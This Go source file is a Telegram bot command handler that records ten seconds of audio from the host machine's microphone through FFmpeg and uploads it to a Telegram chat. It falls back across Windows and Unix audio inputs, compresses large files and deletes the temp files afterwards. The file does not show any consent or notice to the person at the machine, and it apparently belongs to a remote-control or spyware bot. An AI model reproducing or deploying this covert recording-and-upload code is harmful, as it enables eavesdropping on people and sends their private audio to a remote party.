package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type AudioHandler struct {
	api *tgbotapi.BotAPI
}

func NewAudioHandler(api *tgbotapi.BotAPI) *AudioHandler {
	return &AudioHandler{
		api: api,
	}
}

func (h *AudioHandler) HandleAudioCommand(chatID int64) {
	if !h.isFFmpegAvailable() {
		msg := tgbotapi.NewMessage(chatID, "FFmpeg not found. Audio recording requires FFmpeg.")
		h.api.Send(msg)
		return
	}

	msg := tgbotapi.NewMessage(chatID, "Starting audio recording (10 seconds)...")
	h.api.Send(msg)

	audioPath, err := h.recordAudio(10)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Failed to record audio: %v", err))
		h.api.Send(errorMsg)
		return
	}

	fileInfo, err := os.Stat(audioPath)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, "Failed to get audio file info")
		h.api.Send(errorMsg)
		os.Remove(audioPath)
		return
	}

	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)

	if fileSizeMB > 50 {
		compressedPath, err := h.compressAudio(audioPath)
		if err != nil {
			errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Audio too large (%.1fMB) and compression failed: %v", fileSizeMB, err))
			h.api.Send(errorMsg)
			os.Remove(audioPath)
			return
		}

		compressedInfo, err := os.Stat(compressedPath)
		if err != nil {
			errorMsg := tgbotapi.NewMessage(chatID, "Failed to get compressed audio info")
			h.api.Send(errorMsg)
			os.Remove(audioPath)
			os.Remove(compressedPath)
			return
		}

		compressedSizeMB := float64(compressedInfo.Size()) / (1024 * 1024)
		if compressedSizeMB > 50 {
			errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Audio still too large after compression (%.1fMB). Try recording for a shorter duration.", compressedSizeMB))
			h.api.Send(errorMsg)
			os.Remove(audioPath)
			os.Remove(compressedPath)
			return
		}

		os.Remove(audioPath)
		audioPath = compressedPath
		fileSizeMB = compressedSizeMB
	}

	audio := tgbotapi.NewAudio(chatID, tgbotapi.FilePath(audioPath))
	audio.Caption = fmt.Sprintf("Audio Recording (%.1fMB)", fileSizeMB)
	_, err = h.api.Send(audio)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Failed to send audio: %v", err))
		h.api.Send(errorMsg)
	} else {
		successMsg := tgbotapi.NewMessage(chatID, "Audio sent successfully")
		h.api.Send(successMsg)
	}

	os.Remove(audioPath)
}

func (h *AudioHandler) isFFmpegAvailable() bool {
	_, err := exec.LookPath("ffmpeg")
	return err == nil
}

func (h *AudioHandler) recordAudio(duration int) (string, error) {
	audioDir := os.TempDir()
	if err := os.MkdirAll(audioDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create temp directory: %v", err)
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("audio_recording_%s.wav", timestamp)
	audioPath := filepath.Join(audioDir, filename)

	audioInputs := h.getAudioInputs()

	for _, input := range audioInputs {
		cmd := exec.Command("ffmpeg", input...)
		cmd.Args = append(cmd.Args, audioPath)

		err := cmd.Run()
		if err == nil {
			if fileInfo, statErr := os.Stat(audioPath); statErr == nil && fileInfo.Size() > 0 {
				return audioPath, nil
			}
		}
	}

	return "", fmt.Errorf("failed to record audio with any available input method")
}

func (h *AudioHandler) getAudioInputs() [][]string {
	var inputs [][]string
	duration := "10"

	devices := h.getAvailableAudioDevices()

	for _, device := range devices {
		inputs = append(inputs, []string{
			"-f", device.Format,
			"-i", device.Input,
			"-t", duration,
			"-y",
		})
	}

	inputs = append(inputs, h.getFallbackInputs(duration)...)

	return inputs
}

type AudioDevice struct {
	Format string
	Input  string
}

func (h *AudioHandler) getAvailableAudioDevices() []AudioDevice {
	var devices []AudioDevice

	if runtime.GOOS == "windows" {
		devices = append(devices, h.getWindowsAudioDevices()...)
	} else {
		devices = append(devices, h.getUnixAudioDevices()...)
	}

	return devices
}

func (h *AudioHandler) getWindowsAudioDevices() []AudioDevice {
	var devices []AudioDevice

	dshowDevices := h.getDirectShowDevices()
	devices = append(devices, dshowDevices...)

	devices = append(devices, AudioDevice{
		Format: "wasapi",
		Input:  "default",
	})

	return devices
}

func (h *AudioHandler) getDirectShowDevices() []AudioDevice {
	var devices []AudioDevice

	cmd := exec.Command("ffmpeg", "-f", "dshow", "-list_devices", "true", "-i", "dummy")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return devices
	}

	lines := strings.Split(string(output), "\n")
	var audioDevices []string

	for _, line := range lines {
		line = strings.TrimSpace(line)

		// Format: [dshow @ 000001d400f217c0] "Device Name"
		if strings.Contains(line, "[dshow @") && strings.Contains(line, "\"") && strings.Contains(line, "(audio)") {
			start := strings.Index(line, "\"")
			end := strings.LastIndex(line, "\"")
			if start != -1 && end != -1 && start < end {
				deviceName := line[start+1 : end]
				audioDevices = append(audioDevices, deviceName)
			}
		}
	}

	for _, deviceName := range audioDevices {
		devices = append(devices, AudioDevice{
			Format: "dshow",
			Input:  "audio=" + deviceName,
		})
	}

	return devices
}

func (h *AudioHandler) getUnixAudioDevices() []AudioDevice {
	var devices []AudioDevice

	if h.isAudioSystemAvailable("alsa") {
		devices = append(devices, AudioDevice{
			Format: "alsa",
			Input:  "default",
		})
	}

	if h.isAudioSystemAvailable("pulse") {
		devices = append(devices, AudioDevice{
			Format: "pulse",
			Input:  "default",
		})
	}

	if h.isAudioSystemAvailable("jack") {
		devices = append(devices, AudioDevice{
			Format: "jack",
			Input:  "default",
		})
	}

	return devices
}

func (h *AudioHandler) isAudioSystemAvailable(system string) bool {
	cmd := exec.Command("ffmpeg", "-f", system, "-list_devices", "true", "-i", "dummy")
	err := cmd.Run()
	return err == nil
}

func (h *AudioHandler) getFallbackInputs(duration string) [][]string {
	var inputs [][]string

	if runtime.GOOS == "windows" {
		// Windows fallbacks
		inputs = append(inputs, []string{
			"-f", "dshow",
			"-i", "audio=default",
			"-t", duration,
			"-y",
		})

		// Add WASAPI fallback
		inputs = append(inputs, []string{
			"-f", "wasapi",
			"-i", "default",
			"-t", duration,
			"-y",
		})
	} else {
		// Unix/Linux fallbacks
		inputs = append(inputs, []string{
			"-f", "alsa",
			"-i", "default",
			"-t", duration,
			"-y",
		})
	}

	return inputs
}

func (h *AudioHandler) compressAudio(inputPath string) (string, error) {
	dir := filepath.Dir(inputPath)
	ext := filepath.Ext(inputPath)
	name := filepath.Base(inputPath[:len(inputPath)-len(ext)])
	compressedPath := filepath.Join(dir, name+"_compressed.mp3")

	cmd := exec.Command("ffmpeg",
		"-i", inputPath,
		"-acodec", "mp3",
		"-ab", "128k",
		"-ar", "44100",
		"-ac", "2",
		"-y",
		compressedPath,
	)

	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("audio compression failed: %v", err)
	}

	return compressedPath, nil
}
